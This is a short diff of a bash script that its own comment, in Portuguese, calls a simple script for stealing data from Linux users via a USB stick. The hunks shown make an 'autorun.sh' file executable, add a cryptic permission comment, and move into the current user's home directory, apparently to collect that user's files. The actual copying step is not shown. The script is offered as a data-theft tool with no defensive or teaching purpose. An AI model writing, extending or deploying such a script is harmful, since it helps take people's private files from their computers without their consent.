@@ -1,6 +1,7 @@
 #!/bin/bash
 #SCRIPT SIMPLES PARA FURTO DE DADOS usuarios linux (pendrive)
 touch K.txt
+# +x -perm ;x
 
 
 	( echo 20; sleep 1
@@ -12,7 +13,7 @@ touch K.txt
 
 	clear
 
-
+	chmod +x autorun.sh
 # pega o nome do usuario e abre o diretorio dele
         us=$USER        
         cd /home/$us/
